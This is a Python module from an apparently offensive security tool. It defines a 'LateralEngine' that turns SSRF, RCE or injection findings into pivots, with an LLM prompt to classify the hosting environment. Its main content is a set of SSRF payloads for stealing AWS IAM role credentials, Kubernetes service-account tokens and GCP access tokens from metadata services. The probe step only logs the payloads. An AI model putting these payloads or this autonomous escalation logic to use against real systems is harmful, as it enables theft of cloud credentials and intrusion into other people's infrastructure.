import asyncio
from rich.console import Console

from aura.ui.formatter import console

class LateralEngine:
    """
    v18.0 NEBULA GHOST
    Lateral Sovereignty - Autonomous Pivoting & Privilege Escalation Engine.
    """
    def __init__(self, persistence=None, telemetry=None, brain=None, **kwargs):
        self.persistence = persistence
        self.telemetry = telemetry
        self.brain = brain
        self.footholds = [] # List of RCE/SSRF findings
        self.internal_map = {} # {internal_ip: [services]}

    async def pivot_from_finding(self, finding: dict):
        """Attempts to use a finding as a pivot point into the internal network."""
        f_type = finding.get("type", "").lower()
        content = finding.get("content", "")
        
        if "ssrf" in f_type or "rce" in f_type or "injection" in f_type:
            console.print(f"[bold red][🔥] NEBULA: High-Value Foothold Detected: {f_type}. Launching Lateral Pivot...[/bold red]")
            self.footholds.append(finding)
            
            # v18.0: Identify Cloud Environment
            env = await self._identify_environment(finding)
            if env:
                console.print(f"[bold yellow][🛰️] Nebula: Internal Environment Mapped as {env}. Extracting Identities...[/bold yellow]")
                await self._extract_identities(finding, env)

    async def _identify_environment(self, finding):
        """AI analyzes the finding context to identify if it's AWS, Azure, GCP, or K8s."""
        content = finding.get("content", "").lower() + str(finding.get("url", "")).lower()
        
        # Heuristics for quick detection
        if "169.254.169.254" in content or "compute.internal" in content:
            return "AWS"
        if "metadata.google.internal" in content:
            return "GCP"
        if "metadata.azure.com" in content:
            return "AZURE"
        if "kubernetes" in content or "serviceaccount" in content:
            return "K8S"

        prompt = (
            f"As AURA-Zenith Nebula, analyze this finding and identify the internal hosting environment:\n"
            f"Details: {finding.get('content')}\n"
            "Identify if it's AWS (169.254.169.254), Azure, GCP, or K8s (service tokens).\n"
            "Return ONLY the environment name: 'AWS', 'AZURE', 'GCP', 'K8S', or 'LOCAL'."
        )
        try:
            return self.brain.reason_json(prompt).strip().upper()
        except:
            return "LOCAL"

    async def _extract_identities(self, finding, env):
        """Attempts to extract IAM roles, kube-tokens, or environment variables."""
        if env == "AWS":
            console.print("[red][!] Nebula: Attempting IAM Role extraction from Metadata v1...[/red]")
            # AWS Metadata v1 (Simple GET)
            role_payload = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
            await self._run_escalation_probe(finding, role_payload, "AWS IAM Role")
            
        elif env == "K8S":
            console.print("[red][!] Nebula: Probing Service Account tokens in /var/run/secrets/...[/red]")
            token_payload = "file:///var/run/secrets/kubernetes.io/serviceaccount/token"
            await self._run_escalation_probe(finding, token_payload, "K8s Service Token")

        elif env == "GCP":
            console.print("[red][!] Nebula: Probing GCP Metadata (v1 requires Metadata-Flavor header)...[/red]")
            gcp_payload = "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
            await self._run_escalation_probe(finding, gcp_payload, "GCP Access Token")

    async def _run_escalation_probe(self, finding, payload, secret_type):
        """Invokes the appropriate hunter to verify escalation."""
        finding["escalation_attempted"] = True
        finding["escalation_payload"] = payload
        finding["escalation_type"] = secret_type
        console.print(f"[bold cyan][🛰️] Nebula: Escalation Probe Logged: {secret_type} -> {payload}[/bold cyan]")

    def get_lateral_report(self):
        """Generates a summary of the internal discovery."""
        return "### Lateral Movement & Pivoting\n- Identified Footholds: " + str(len(self.footholds))
